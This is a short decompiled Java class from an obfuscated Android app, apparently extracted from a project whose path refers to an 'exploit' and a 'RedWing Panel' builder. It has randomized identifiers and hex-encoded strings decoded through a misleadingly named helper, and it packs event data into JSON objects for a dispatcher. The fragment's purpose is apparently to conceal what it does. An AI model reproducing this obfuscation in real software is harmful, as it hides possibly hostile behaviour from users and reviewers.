package v.s;

import app.mobilex.plus.util.TypefaceCache;
import java.io.Serializable;
import org.json.JSONObject;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class ubmqYDSfxvxS extends LGm23hksIOxB implements dH2v3dH2vcwr1cxQ4F {
    public final /* synthetic */ RWY6BVSB0XxPbw JXn4Qf7zpnLjP5;
    public final /* synthetic */ int vekpFI4d1Nc4fakF;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public /* synthetic */ ubmqYDSfxvxS(RWY6BVSB0XxPbw rWY6BVSB0XxPbw, int i) {
        super(3);
        this.vekpFI4d1Nc4fakF = i;
        this.JXn4Qf7zpnLjP5 = rWY6BVSB0XxPbw;
    }

    private static /* synthetic */ void fqxjhka() {
    }

    public final Object dDIMxZXP1V8HdM(Object obj, Serializable serializable, Object obj2) {
        switch (this.vekpFI4d1Nc4fakF) {
            case 0:
                String str = (String) obj;
                boolean zBooleanValue = ((Boolean) serializable).booleanValue();
                JSONObject jSONObject = (JSONObject) obj2;
                try {
                    RWY6BVSB0XxPbw rWY6BVSB0XxPbw = this.JXn4Qf7zpnLjP5;
                    JSONObject jSONObject2 = new JSONObject();
                    jSONObject2.put(TypefaceCache.obtain("0037006F004B0082"), TypefaceCache.obtain("003400650064008400FF00B200DF00A6002D00720064009500F500AC00C700AB0037"));
                    jSONObject2.put(TypefaceCache.obtain("0020007B005F00B800F900BB"), str);
                    jSONObject2.put(TypefaceCache.obtain("003000630058008400F500AC00C1"), zBooleanValue);
                    if (jSONObject != null) {
                        jSONObject2.put(TypefaceCache.obtain("002600640049008800E2"), jSONObject.toString());
                    }
                    rWY6BVSB0XxPbw.H9XlUr4OeMJFiXK(jSONObject2);
                    break;
                } catch (Exception unused) {
                }
                break;
            default:
                int iIntValue = ((Number) serializable).intValue();
                int iIntValue2 = ((Number) obj2).intValue();
                this.JXn4Qf7zpnLjP5.J0zjQ7CAgohuxU20eCW6((byte[]) obj, iIntValue, iIntValue2);
                break;
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
